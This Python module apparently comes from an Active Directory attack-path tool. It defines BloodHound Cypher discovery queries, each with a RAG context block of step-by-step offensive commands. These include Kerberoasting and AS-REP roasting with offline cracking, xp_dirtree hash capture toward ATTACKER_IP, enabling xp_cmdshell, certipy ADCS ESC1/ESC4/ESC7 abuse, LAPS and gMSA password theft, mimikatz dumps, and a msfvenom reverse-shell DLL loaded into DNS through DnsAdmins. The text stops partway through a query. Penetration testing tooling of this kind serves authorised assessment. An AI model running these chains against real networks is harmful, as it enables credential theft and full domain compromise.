"""
Discovery Queries for Attack Path Analysis
Location: backend/routers/attack_paths/constants/static_queries.py

Discovery queries detect compromisable sources and high-value targets via node
properties and service-specific edges. Multi-hop path-based queries are handled
dynamically by chain discovery (weighted shortest path in edge_costs.py).

Two categories:
- DISCOVERY_QUERIES: Property-based and service detection (~30 queries)
- TARGET_DISCOVERY_QUERIES: Identify high-value targets for chain discovery
"""

DISCOVERY_QUERIES = [
    # ===========================================
    # Core Kerberos Attacks
    # ===========================================
    {
        "name": "All Kerberoastable Service Accounts",
        "description": "All users with SPNs that can be Kerberoasted - service accounts often have weak passwords or password reuse",
        "cypher": """MATCH p=(u:User {hasspn: true, enabled: true})-[:MemberOf*1..2]->(g:Group)
WHERE NOT u.objectid ENDS WITH '-502'
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "High",
        "edges_used": ["Kerberoastable"],
        "rag_context": """KERBEROASTING ATTACK - SERVICE ACCOUNT CREDENTIAL THEFT:
This finding identifies service accounts with SPNs that can be Kerberoasted.
Service accounts are high-value targets because they often have:
1. Weak or guessable passwords
2. Password reuse with privileged accounts
3. Passwords that haven't been rotated

ATTACK CHAIN:
1. ENUMERATE: GetUserSPNs.py domain/user:pass -dc-ip DC_IP
2. REQUEST TGS: GetUserSPNs.py domain/user:pass -request -outputfile hashes.txt
3. CRACK OFFLINE: hashcat -m 13100 hashes.txt rockyou.txt (or john --format=krb5tgs)
4. USE CREDENTIALS: wmiexec.py, psexec.py, or Enter-PSSession with cracked password

TOOLS: GetUserSPNs.py (Impacket), Rubeus kerberoast, hashcat, john
MITRE: T1558.003 (Kerberoasting)"""
    },
    {
        "name": "Kerberoastable Service Accounts in High-Value Groups",
        "description": "Users with SPNs that are members of privileged groups - direct path to domain compromise",
        "cypher": """MATCH p=(u:User {hasspn: true, enabled: true})-[:MemberOf*1..]->(g:Group)
WHERE NOT u.objectid ENDS WITH '-502'
  AND (g.highvalue = true OR g.admincount = true OR g.objectid ENDS WITH '-512')
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "Critical",
        "edges_used": ["Kerberoastable", "MemberOf"]
    },
    {
        "name": "All AS-REP Roastable Accounts",
        "description": "Users without Kerberos pre-authentication - can obtain AS-REP hash without credentials",
        "cypher": """MATCH p=(u:User {dontreqpreauth: true, enabled: true})-[:MemberOf*1..2]->(g:Group)
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "High",
        "edges_used": ["ASREPRoastable"],
        "rag_context": """AS-REP ROASTING ATTACK - NO CREDENTIALS REQUIRED:
This finding identifies accounts without Kerberos pre-authentication.
These accounts are extremely valuable because you can request their AS-REP hash WITHOUT any credentials.

ATTACK CHAIN:
1. ENUMERATE: GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC_IP -no-pass
2. REQUEST AS-REP: GetNPUsers.py domain/username -dc-ip DC_IP -no-pass -format hashcat
3. CRACK OFFLINE: hashcat -m 18200 hashes.txt rockyou.txt
4. USE CREDENTIALS: Authenticate with cracked password

TOOLS: GetNPUsers.py (Impacket), Rubeus asreproast, hashcat, john
MITRE: T1558.004 (AS-REP Roasting)"""
    },
    {
        "name": "AS-REP Roastable Accounts in High-Value Groups",
        "description": "Users without pre-auth that are members of privileged groups",
        "cypher": """MATCH p=(u:User {dontreqpreauth: true, enabled: true})-[:MemberOf*1..]->(g:Group)
WHERE g.highvalue = true OR g.admincount = true OR g.objectid ENDS WITH '-512'
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "Critical",
        "edges_used": ["ASREPRoastable", "MemberOf"]
    },

    # ===========================================
    # Delegation Discovery
    # ===========================================
    {
        "name": "Unconstrained Delegation Computers",
        "description": "Computers with unconstrained delegation - showing admin paths to these computers",
        "cypher": """MATCH p=(u)-[:AdminTo]->(c:Computer {unconstraineddelegation: true})
WHERE u.enabled = true OR u:Group
RETURN p
LIMIT 30""",
        "attack_type": "credential_access",
        "priority": "Critical",
        "edges_used": ["AdminTo", "UnconstrainedDelegation"]
    },
    {
        "name": "Constrained Delegation Abuse",
        "description": "Principals with constrained delegation that can be abused for privilege escalation",
        "cypher": """MATCH p=(u)-[:AllowedToDelegate]->(c:Computer)
WHERE (u.enabled = true OR u:Computer)
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "High",
        "edges_used": ["AllowedToDelegate"]
    },

    # ===========================================
    # Service Detection: MSSQL
    # ===========================================
    {
        "name": "MSSQL Admin Access",
        "description": "Principals with SQLAdmin rights on SQL Servers - enables command execution via xp_cmdshell",
        "cypher": """MATCH p=(n)-[:SQLAdmin]->(c:Computer)
WHERE (n.enabled = true OR n:Group)
RETURN p
LIMIT 50""",
        "attack_type": "lateral_movement",
        "priority": "Critical",
        "edges_used": ["SQLAdmin"],
        "rag_context": """MSSQL ADMIN ACCESS - HASH CAPTURE AND COMMAND EXECUTION:

This finding identifies principals with SQLAdmin rights on SQL Servers.

PRIMARY ATTACK: NTLM hash capture via xp_dirtree (works even without sysadmin):
1. START LISTENER: sudo responder -I tun0 (on attacker machine)
2. CONNECT: impacket-mssqlclient {domain}/{user}:'{password}'@{target} -windows-auth
3. CAPTURE HASH: EXEC xp_dirtree '\\\\ATTACKER_IP\\share',1,1;
   (Responder captures the SQL service account's NTLMv2 hash)
4. CRACK: hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
5. USE: evil-winrm -i {target} -u 'sql_svc' -p 'cracked_password'

SECONDARY ATTACK: xp_cmdshell (only if sysadmin):
1. ENABLE: EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
2. EXECUTE: EXEC xp_cmdshell 'whoami';

POST-EXPLOITATION: Check SQL error logs for plaintext credentials:
  type C:\\SQLServer\\Logs\\ERRORLOG.BAK

TOOLS: impacket-mssqlclient, responder, hashcat, evil-winrm
MITRE: T1059.001 (Command Execution), T1557 (Adversary-in-the-Middle)"""
    },
    {
        "name": "MSSQL Service Accounts (Kerberoastable)",
        "description": "SQL service accounts with SPNs - Kerberoast to gain MSSQL access",
        "cypher": """MATCH p=(u:User)-[:MemberOf*0..2]->(g:Group)
WHERE (u.name =~ '(?i).*sql.*' OR u.name =~ '(?i).*mssql.*' OR u.serviceprincipalnames =~ '(?i).*mssql.*')
AND u.hasspn = true
AND (u.enabled = true OR u.enabled IS NULL)
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "High",
        "edges_used": ["Kerberoastable", "MemberOf"],
        "rag_context": """MSSQL SERVICE ACCOUNT KERBEROASTING:

SQL service accounts often have weak passwords and SPNs, making them Kerberoastable.
Compromising these accounts grants access to SQL Server instances.

ATTACK CHAIN:
1. KERBEROAST: GetUserSPNs.py {domain}/{user}:{pass} -request -outputfile sql_hashes.txt
2. CRACK OFFLINE: hashcat -m 13100 sql_hashes.txt rockyou.txt
3. CONNECT TO MSSQL: impacket-mssqlclient {domain}/SQL_SVC:'{cracked_pass}'@{sql_server} -windows-auth
4. ENUMERATE LINKED SERVERS: EXEC sp_linkedservers;
5. ENABLE xp_cmdshell: EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

MSSQL ATTACKS AFTER ACCESS:
- xp_cmdshell for OS command execution
- xp_dirtree for hash capture (point to Responder)
- sp_linkedservers for linked server enumeration
- sp_configure for enabling dangerous procedures

TOOLS: GetUserSPNs.py, impacket-mssqlclient, hashcat
MITRE: T1558.003 (Kerberoasting), T1059.001 (Command Execution)"""
    },

    # ===========================================
    # Service Detection: ADCS (Certificate Services)
    # ===========================================
    {
        "name": "ADCS ESC1 - Misconfigured Certificate Templates",
        "description": "Certificate templates vulnerable to ESC1 - enrollee can specify arbitrary SAN",
        "cypher": """MATCH p=(n)-[:Enroll|AutoEnroll]->(ct:CertTemplate)-[:PublishedTo]->(ca:EnterpriseCA)
WHERE ct.enrolleesuppliessubject = true
AND ct.authenticationenabled = true
AND (n.enabled = true OR n:Group)
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["Enroll", "AutoEnroll", "PublishedTo", "ADCSESC1"],
        "rag_context": """ADCS ESC1 - CERTIFICATE TEMPLATE MISCONFIGURATION:

ESC1 occurs when a certificate template allows enrollees to specify an arbitrary Subject Alternative Name (SAN).
This allows any enrollee to request a certificate for any user, including Domain Admin.

IMPORTANT: The vulnerable template name IS the TARGET in the finding. Use it in commands.

ATTACK CHAIN:
1. ENUMERATE: certipy find -u USER@DOMAIN -p 'PASSWORD' -dc-ip DC_IP -stdout -vulnerable
2. REQUEST CERT: certipy req -u USER@DOMAIN -p 'PASSWORD' -ca CA_NAME -template <TARGET_TEMPLATE_NAME> -upn administrator@DOMAIN -dc-ip DC_IP
3. AUTHENTICATE: certipy auth -pfx administrator.pfx -dc-ip DC_IP
4. RESULT: NT hash for Administrator

VULNERABLE TEMPLATE INDICATORS:
- Enrollee Supplies Subject = True
- Client Authentication EKU enabled
- Low-privilege users can enroll

TOOLS: certipy, Certify (Windows), PKINIT
MITRE: T1649 (Steal or Forge Authentication Certificates)"""
    },
    {
        "name": "ADCS ESC4 - Vulnerable Certificate Template ACLs",
        "description": "Principals with write access to certificate templates - can modify template to enable ESC1",
        "cypher": """MATCH p=(n)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|WriteProperty]->(ct:CertTemplate)
WHERE (n.enabled = true OR n:Group)
AND NOT n.objectid ENDS WITH '-512'
AND NOT n.objectid ENDS WITH '-519'
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["GenericAll", "GenericWrite", "WriteDacl", "WriteProperty", "ADCSESC4"],
        "rag_context": """ADCS ESC4 - CERTIFICATE TEMPLATE ACL ABUSE:

ESC4 occurs when a low-privilege principal has write access to a certificate template.
The attacker can modify the template to enable ESC1 conditions.

IMPORTANT: The template name IS the TARGET in the finding. Use it in commands.

ATTACK CHAIN:
1. ENUMERATE: certipy find -u USER@DOMAIN -p 'PASSWORD' -vulnerable -stdout
2. MODIFY TEMPLATE: certipy template -u USER@DOMAIN -p 'PASSWORD' -template <TARGET_TEMPLATE_NAME> -save-old
3. REQUEST CERT (ESC1): certipy req -u USER@DOMAIN -p 'PASSWORD' -ca CA_NAME -template <TARGET_TEMPLATE_NAME> -upn administrator@DOMAIN
4. RESTORE TEMPLATE: certipy template -u USER@DOMAIN -p 'PASSWORD' -template <TARGET_TEMPLATE_NAME> -configuration old_config.json
5. AUTHENTICATE: certipy auth -pfx administrator.pfx

TOOLS: certipy, Certify, modifyCertTemplate.py
MITRE: T1649 (Steal or Forge Authentication Certificates)"""
    },
    {
        "name": "ADCS CA Service Accounts",
        "description": "Certificate Authority service accounts - high-value targets for ADCS attacks",
        "cypher": """MATCH p=(u:User)-[:MemberOf*0..2]->(g:Group)
WHERE (u.name =~ '(?i).*ca_svc.*' OR u.name =~ '(?i).*certsvc.*' OR u.name =~ '(?i).*adcs.*' OR u.name =~ '(?i).*pki.*')
AND (u.enabled = true OR u.enabled IS NULL)
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "High",
        "edges_used": ["MemberOf"],
        "rag_context": """ADCS SERVICE ACCOUNT - CERTIFICATE AUTHORITY TARGETING:

Certificate Authority service accounts (CA_SVC, CERTSVC) are high-value targets.
Compromising these accounts can enable:
1. Golden Certificate attacks
2. Certificate template modifications
3. Arbitrary certificate issuance

ATTACK CHAIN (if Kerberoastable):
1. KERBEROAST: GetUserSPNs.py {domain}/{user}:{pass} -request -outputfile ca_hashes.txt
2. CRACK OFFLINE: hashcat -m 13100 ca_hashes.txt rockyou.txt
3. ENUMERATE ADCS: certipy find -u CA_SVC@{domain} -p '{cracked_pass}' -dc-ip {dc_ip}

ADCS ENUMERATION (general):
certipy find -u {user}@{domain} -p '{password}' -dc-ip {dc_ip} -stdout -vulnerable

COMMON VULNERABLE TEMPLATES: User, UserAuthentication, Machine, WebServer

TOOLS: Certipy, Certify, GetUserSPNs.py
MITRE: T1649 (Steal or Forge Authentication Certificates), T1558.003 (Kerberoasting)"""
    },
    {
        "name": "ManageCA Rights",
        "description": "Principals with ManageCA rights on Certificate Authorities - can issue arbitrary certificates",
        "cypher": """MATCH p=(n)-[:ManageCA|ManageCertificates]->(ca:EnterpriseCA)
WHERE (n.enabled = true OR n:Group)
AND NOT n.objectid ENDS WITH '-512'
AND NOT n.objectid ENDS WITH '-519'
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["ManageCA", "ManageCertificates"],
        "rag_context": """MANAGECA RIGHTS - ADCS ESC7 ATTACK:

ManageCA rights allow managing the Certificate Authority, enabling ESC7 attacks.
This can be used to:
1. Add new officers/managers
2. Enable SubCA certificate template
3. Issue certificates to any subject

ATTACK CHAIN:
1. ADD OFFICER: certipy ca -u {user}@{domain} -p '{password}' -ca {ca_name} -add-officer {user}
2. ENABLE SUBCA: certipy ca -u {user}@{domain} -p '{password}' -ca {ca_name} -enable-template SubCA
3. REQUEST SUBCA CERT: certipy req -u {user}@{domain} -p '{password}' -ca {ca_name} -template SubCA
4. ISSUE PENDING REQUEST: certipy ca -u {user}@{domain} -p '{password}' -ca {ca_name} -issue-request {request_id}
5. RETRIEVE & AUTH: certipy req -u {user}@{domain} -p '{password}' -ca {ca_name} -retrieve {request_id}

TOOLS: Certipy, Certify
MITRE: T1649 (Steal or Forge Authentication Certificates)"""
    },
    {
        "name": "CERT_PUBLISHERS Group Members",
        "description": "Members of CERT_PUBLISHERS group - may have elevated ADCS privileges",
        "cypher": """MATCH p=(n)-[:MemberOf*1..2]->(g:Group)
WHERE g.name =~ '(?i).*cert.?publishers.*'
AND (n.enabled = true OR n:Group)
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Medium",
        "edges_used": ["MemberOf"],
        "rag_context": """CERT_PUBLISHERS GROUP - ADCS PRIVILEGE ESCALATION:

Members of the Cert Publishers group have elevated privileges in ADCS environments.
This group typically has:
1. Enroll permissions on certificate templates
2. Access to CA configuration
3. Potential paths to ESC attacks

ENUMERATION:
certipy find -u {user}@{domain} -p '{password}' -dc-ip {dc_ip} -vulnerable

TOOLS: Certipy, Certify, BloodHound
MITRE: T1649 (Steal or Forge Authentication Certificates)"""
    },
    {
        "name": "ADCS ESC Edges (All Variants)",
        "description": "All ADCS ESC1-ESC16 edges from BloodHound CE - catches every ADCS misconfiguration edge type",
        "cypher": """MATCH p=(n)-[r]->(target)
WHERE type(r) STARTS WITH 'ADCSESC'
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["ADCSESC1", "ADCSESC2", "ADCSESC3", "ADCSESC4", "ADCSESC5", "ADCSESC6", "ADCSESC6a", "ADCSESC6b", "ADCSESC7", "ADCSESC8", "ADCSESC9", "ADCSESC9a", "ADCSESC9b", "ADCSESC10", "ADCSESC10a", "ADCSESC10b", "ADCSESC11", "ADCSESC12", "ADCSESC13", "ADCSESC14", "ADCSESC15", "ADCSESC16"],
        "rag_context": """ADCS ESC VULNERABILITIES - COMPREHENSIVE DETECTION:

BloodHound CE detects ADCS misconfigurations and creates explicit ADCSESC* edges.
This query catches ALL ESC variants (ESC1-ESC16).

IMPORTANT: The TARGET in the finding is the vulnerable certificate template or CA. Use it in commands.

COMMON ESC ATTACKS:

**ESC1 (Enrollee Supplies Subject):**
certipy req -u attacker@DOMAIN -p pass -ca CA_NAME -template <TARGET_TEMPLATE_NAME> -upn administrator@DOMAIN

**ESC4 (Vulnerable Template ACLs):**
certipy template -u attacker@DOMAIN -p pass -template <TARGET_TEMPLATE_NAME> -save-old
certipy req ... (then ESC1)

**ESC8 (Web Enrollment NTLM Relay):**
ntlmrelayx.py -t http://ca/certsrv/certfnsh.asp --adcs --template DomainController

UNIVERSAL AUTHENTICATION:
certipy auth -pfx administrator.pfx -dc-ip DC_IP
# Result: NT hash for target user

ENUMERATION:
certipy find -u attacker@DOMAIN -p pass -vulnerable -stdout

TOOLS: certipy, Certify, ntlmrelayx
MITRE: T1649 (Steal or Forge Authentication Certificates)"""
    },

    # ===========================================
    # Credential Access: LAPS and GMSA
    # ===========================================
    {
        "name": "ReadLAPSPassword",
        "description": "Principals who can read LAPS passwords - instant local admin on computers",
        "cypher": """MATCH p=(n)-[:ReadLAPSPassword|SyncLAPSPassword]->(c:Computer)
WHERE (n.enabled = true OR n:Group)
AND NOT n.objectid ENDS WITH '-512'
AND NOT n.objectid ENDS WITH '-519'
AND NOT n.objectid ENDS WITH '-544'
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "High",
        "edges_used": ["ReadLAPSPassword", "SyncLAPSPassword"],
        "rag_context": """LAPS PASSWORD RETRIEVAL - INSTANT LOCAL ADMIN:

LAPS (Local Administrator Password Solution) stores unique local admin passwords
for each computer in Active Directory. ReadLAPSPassword grants access to these credentials.

ATTACK CHAIN:
1. READ LAPS PASSWORD:
   nxc ldap DC_IP -u attacker -p pass -M laps
   OR: Get-LAPSPassword -ComputerName {target} (PowerView)
   OR: bloodyAD -d {domain} -u attacker -p pass --host DC get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime

2. AUTHENTICATE AS LOCAL ADMIN:
   evil-winrm -i {target} -u Administrator -p 'LAPS_PASSWORD'
   OR: psexec.py {domain}/Administrator:'LAPS_PASSWORD'@{target}

3. DUMP CREDENTIALS (if DA logged in):
   mimikatz # sekurlsa::logonpasswords

TOOLS: nxc, bloodyAD, PowerView, pyLAPS
MITRE: T1552.002 (Unsecured Credentials: Credentials in Registry)"""
    },
    {
        "name": "ReadGMSAPassword",
        "description": "Principals who can read gMSA passwords - service account credential theft",
        "cypher": """MATCH p=(n)-[:ReadGMSAPassword|DumpSMSAPassword]->(target)
WHERE (n.enabled = true OR n:Group)
AND NOT n.objectid ENDS WITH '-512'
AND NOT n.objectid ENDS WITH '-519'
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "High",
        "edges_used": ["ReadGMSAPassword", "DumpSMSAPassword"],
        "rag_context": """GMSA PASSWORD RETRIEVAL - SERVICE ACCOUNT TAKEOVER:

Group Managed Service Accounts (gMSA) have passwords managed by AD and stored in
the msDS-ManagedPassword attribute. Authorized principals can retrieve these passwords.

ATTACK CHAIN:
1. READ GMSA PASSWORD:
   gMSADumper.py -d {domain} -u attacker -p pass
   OR: bloodyAD -d {domain} -u attacker -p pass --host DC get object 'gMSA_ACCOUNT$' --attr msDS-ManagedPassword
   OR: Get-ADServiceAccount -Identity gMSA_ACCOUNT -Properties msDS-ManagedPassword

2. CONVERT TO NT HASH:
   The gMSADumper tool outputs the NT hash directly

3. AUTHENTICATE AS GMSA:
   evil-winrm -i TARGET -u 'gMSA_ACCOUNT$' -H gmsa_nt_hash
   OR: impacket-psexec -hashes :gmsa_nt_hash {domain}/'gMSA_ACCOUNT$'@TARGET

GMSA PRIVILEGES:
- gMSAs often run critical services (SQL, IIS, scheduled tasks)
- May have admin access to multiple servers
- Can be members of privileged groups

TOOLS: gMSADumper, bloodyAD, GMSAPasswordReader
MITRE: T1552 (Unsecured Credentials)"""
    },

    # ===========================================
    # Dangerous Group Memberships
    # ===========================================
    {
        "name": "Dangerous Group Memberships",
        "description": "Membership in operationally-dangerous groups (DnsAdmins, Backup Operators, etc.)",
        "cypher": """MATCH p=(n)-[:MemberOf]->(g:Group)
WHERE g.name =~ '(?i).*(dnsadmin|backup.?operator|server.?operator|account.?operator|print.?operator|hyper-v.?admin|exchange.?(windows|trusted)|group.?policy.?creator|remote.?desktop.?user|remote.?management.?user).*'
AND (n.enabled = true OR n:Group)
AND NOT n.objectid ENDS WITH '-500'
AND NOT n.objectid ENDS WITH '-512'
AND NOT n.objectid ENDS WITH '-519'
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "High",
        "edges_used": ["MemberOf"],
        "rag_context": """DANGEROUS GROUP MEMBERSHIPS — HIDDEN ESCALATION PATHS:

These groups are NOT always marked as highvalue in BloodHound but enable well-documented
privilege escalation to Domain Admin:

- DnsAdmins: DLL injection on DNS service -> SYSTEM on DC (T1574.001)
- Backup Operators: SeBackupPrivilege -> ntds.dit extraction -> all hashes
- Server Operators: Service control on DC -> SYSTEM via service abuse
- Account Operators: Create/modify users, add to most groups (Forest HTB)
- Exchange Windows Permissions: WriteDacl on domain -> DCSync (Forest HTB)
- Exchange Trusted Subsystem: Member of Exchange Windows Permissions
- Hyper-V Administrators: Full control over virtualized DCs
- Print Operators: Load drivers on DC -> kernel exploitation
- Remote Desktop Users: RDP access to systems (lateral movement)
- Remote Management Users: WinRM access to systems (lateral movement)

DNSADMINS ESCALATION:
1. CREATE DLL: msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f dll > exploit.dll
2. HOST DLL: impacket-smbserver share $(pwd) -smb2support
3. SET DLL: dnscmd {dc} /config /serverlevelplugindll \\\\{attacker_ip}\\share\\exploit.dll
4. RESTART DNS: sc \\\\{dc} stop dns && sc \\\\{dc} start dns

BACKUP OPERATORS ESCALATION:
1. CONNECT: evil-winrm -i {dc} -u {user} -p '{pass}'
2. EXTRACT NTDS: diskshadow -> robocopy -> ntds.dit + SYSTEM hive
3. DUMP HASHES: impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

TOOLS: dnscmd, msfvenom, diskshadow, robocopy, impacket-secretsdump, evil-winrm
MITRE: T1574.001 (DLL Injection), T1003.003 (NTDS), T1078 (Valid Accounts)"""
    },

    # ===========================================
    # Domain Trust Relationships
    # ===========================================
    {
        "name": "Domain Trust Relationships",
        "description": "Trust relationships between domains - cross-domain attack paths",
        "cypher": """MATCH p=(d1:Domain)-[r:TrustedBy]->(d2:Domain)
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Medium",
        "edges_used": ["TrustedBy"],
        "rag_context": """DOMAIN TRUST RELATIONSHIPS:

Domain trusts enable authentication across domain boundaries. Understanding
trust direction is critical for cross-domain attacks.

TRUST TYPES:
- Parent-Child: Bidirectional, transitive
- Forest: Can be one-way or bidirectional
- External: One-way, non-transitive

ATTACK VECTORS:
1. SID History Injection (if trust has SID filtering disabled)
2. Kerberos delegation across trusts
3. Foreign group membership exploitation
4. Golden ticket with ExtraSids

ENUMERATION:
Get-DomainTrust
nltest /trusted_domains
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

CROSS-TRUST ATTACKS:
- If child domain admin: ExtraSids Golden Ticket to parent
- If trust has weak SID filtering: SID History injection
- If foreign principals in local groups: Compromise foreign user

TOOLS: mimikatz (golden ticket), PowerView, BloodHound
MITRE: T1482 (Domain Trust Discovery)"""
    },

    # ===========================================
    # Outbound Object Control (ACL-based sources)
    # ===========================================
    {
        "name": "Outbound Object Control - Users with ACL Abuse Paths",
        "description": "Users with outbound control edges (WriteOwner, GenericAll, GenericWrite, WriteDacl, AddKeyCredentialLink) on groups, users, or computers - these are chain discovery sources",
        "cypher": """MATCH p=(u:User)-[r:WriteOwner|GenericAll|GenericWrite|WriteDacl|Owns|AddKeyCredentialLink|ForceChangePassword]->(target)
WHERE u <> target
AND (u.enabled = true OR u.enabled IS NULL)
AND NOT u.objectid ENDS WITH '-500'
AND NOT u.objectid ENDS WITH '-502'
AND NOT u.objectid ENDS WITH '-512'
AND NOT u.objectid ENDS WITH '-519'
AND NOT u.objectid ENDS WITH '-544'
RETURN p
LIMIT 100""",
        "attack_type": "privilege_escalation",
        "priority": "High",
        "edges_used": ["WriteOwner", "GenericAll", "GenericWrite", "WriteDacl", "Owns", "AddKeyCredentialLink", "ForceChangePassword"],
        "rag_context": """OUTBOUND OBJECT CONTROL - ACL-BASED PRIVILEGE ESCALATION:

This finding identifies non-admin users with outbound control edges over other AD objects.
These users can manipulate the target objects to escalate privileges, even without
any exploitable property (no SPN, pre-auth required, etc.).

COMMON ATTACK PATTERNS:
- WriteOwner on Group → take ownership → add self → inherit group privileges
- GenericAll on User → reset password, set SPN (targeted kerberoasting), shadow credentials
- GenericWrite on User → shadow credentials (AddKeyCredentialLink), set SPN
- WriteDacl on Object → modify ACL to grant yourself full control
- AddKeyCredentialLink on User → shadow credentials attack (msDS-KeyCredentialLink)

SHADOW CREDENTIALS ATTACK (GenericWrite/GenericAll on User):
1. ATTACK: certipy shadow auto -u attacker@DOMAIN -p pass -account TARGET_USER
   OR: pywhisker -d DOMAIN -u attacker -p pass --target TARGET_USER --action add
2. AUTHENTICATE: certipy auth -pfx TARGET_USER.pfx -dc-ip DC_IP
3. RESULT: NT hash for target user

WRITEOWNER ESCALATION:
1. TAKE OWNERSHIP: impacket-owneredit -action write -new-owner attacker -target TARGET domain/attacker:pass
2. GRANT RIGHTS: impacket-dacledit -action write -rights FullControl -principal attacker -target TARGET domain/attacker:pass
3. EXPLOIT: Now you have GenericAll on the target

TOOLS: certipy, pywhisker, bloodyAD, impacket-owneredit, impacket-dacledit, PowerView
MITRE: T1222.001 (File and Directory Permissions Modification: Windows)"""
    },

    # ===========================================
    # Group Self-Addition and Manipulation
    # ===========================================
    {
        "name": "AddSelf - Group Self-Enrollment",
        "description": "Principals that can add themselves to groups - direct privilege escalation via group membership inheritance",
        "cypher": """MATCH p=(n)-[:AddSelf]->(g:Group)
WHERE (n.enabled = true OR n:Computer OR n:Group)
AND NOT n.objectid ENDS WITH '-500'
AND NOT n.objectid ENDS WITH '-512'
AND NOT n.objectid ENDS WITH '-519'
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["AddSelf"],
        "rag_context": """ADDSELF - GROUP SELF-ENROLLMENT PRIVILEGE ESCALATION:

This finding identifies principals that can add THEMSELVES to an AD GROUP using the AddSelf edge.

CRITICAL RULES:
1. The TARGET is a GROUP (not a computer). You CANNOT connect to a group via RDP/WinRM/evil-winrm.
2. The SOURCE is the entity with the AddSelf right. Use the SOURCE name in commands, NOT the target name.
3. If SOURCE is a Computer (e.g., IT-COMPUTER3$), use ITS machine account hash — NOT the target group name with $.
   Example: The source is IT-COMPUTER3$, the target is HELPDESK group.
   CORRECT: bloodyAD ... -u 'IT-COMPUTER3$' ... add groupMember 'HELPDESK' 'IT-COMPUTER3$'
   WRONG:   bloodyAD ... -u 'HELPDESK$' ... (HELPDESK is a group, not a machine)

ATTACK CHAIN (when source is a Computer account):

Step 1 — OBTAIN THE SOURCE COMPUTER'S MACHINE ACCOUNT HASH:
   The SOURCE computer account authenticates using its NT hash. Obtain it via:
   $ impacket-secretsdump {domain}/{admin_user}:'{pass}'@{source_computer}.{domain} -just-dc-user '{source_computer}$'
   OR: On the machine itself: mimikatz # sekurlsa::logonpasswords

Step 2 — ADD THE SOURCE COMPUTER TO THE TARGET GROUP:
   Use the SOURCE computer's credentials to add itself to the target group.
   $ bloodyAD -d {domain} -u '{source_computer}$' -p ':{machine_ntlm_hash}' --host DC.{domain} add groupMember '{target_group}' '{source_computer}$'

Step 3 — ENUMERATE INHERITED GROUP PRIVILEGES:
   Now that the source computer is in the group, check what permissions the group has:
   $ bloodyAD -d {domain} -u '{source_computer}$' -p ':{machine_ntlm_hash}' --host DC.{domain} get membership '{target_group}'
   Look for: ForceChangePassword, GenericAll, AdminTo, AddMember, WriteDacl, etc.

Step 4 — EXPLOIT INHERITED PRIVILEGES:
   Use the group's permissions. Common patterns:
   - Group has ForceChangePassword → reset a user's password
   - Group has GenericAll → take over accounts
   - Group has AdminTo → get admin on computers

ATTACK CHAIN (when source is a User account):

Step 1 — ADD SELF TO GROUP:
   $ bloodyAD -d {domain} -u {user} -p '{pass}' --host DC.{domain} add groupMember '{target_group}' '{user}'
Step 2 — INHERIT GROUP PRIVILEGES and continue escalation.

TOOLS: bloodyAD, impacket-net, impacket-secretsdump, PowerShell AD Module
MITRE: T1098 (Account Manipulation)"""
    },
    {
        "name": "AddMember - Group Membership Manipulation",
        "description": "Non-admin principals that can add members to groups - enables privilege escalation by granting group rights to controlled accounts",
        "cypher": """MATCH p=(n)-[:AddMember]->(g:Group)
WHERE (n.enabled = true OR n:Computer OR n:Group)
AND NOT n.objectid ENDS WITH '-500'
AND NOT n.objectid ENDS WITH '-512'
AND NOT n.objectid ENDS WITH '-519'
AND NOT n.objectid ENDS WITH '-544'
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "High",
        "edges_used": ["AddMember"],
        "rag_context": """ADDMEMBER - GROUP MEMBERSHIP MANIPULATION:

This finding identifies principals that can add arbitrary members to a group.
Unlike AddSelf (which only allows adding yourself), AddMember allows adding ANY principal.

ATTACK CHAIN:
1. ADD CONTROLLED ACCOUNT TO TARGET GROUP:
   bloodyAD -d {domain} -u {user} -p '{pass}' --host DC.{domain} add groupMember '{target_group}' '{controlled_user}'
   OR: net group "{target_group}" {controlled_user} /add /domain

2. CONTROLLED ACCOUNT NOW INHERITS GROUP PRIVILEGES:
   - If target is Domain Admins/Enterprise Admins: instant domain compromise
   - If target has outbound control (ForceChangePassword, GenericAll): use inherited rights

3. CLEANUP (OPSEC):
   bloodyAD -d {domain} -u {user} -p '{pass}' --host DC.{domain} remove groupMember '{target_group}' '{controlled_user}'

TOOLS: bloodyAD, net.exe, PowerShell AD Module, PowerView
MITRE: T1098.007 (Account Manipulation)"""
    },

    # ===========================================
    # Force Password Change
    # ===========================================
    {
        "name": "ForceChangePassword - Password Reset Rights",
        "description": "Non-admin users/groups that can reset other users' passwords without knowing the current password",
        "cypher": """MATCH p=(n)-[:ForceChangePassword]->(target:User)
WHERE (n.enabled = true OR n:Group)
AND NOT n.objectid ENDS WITH '-500'
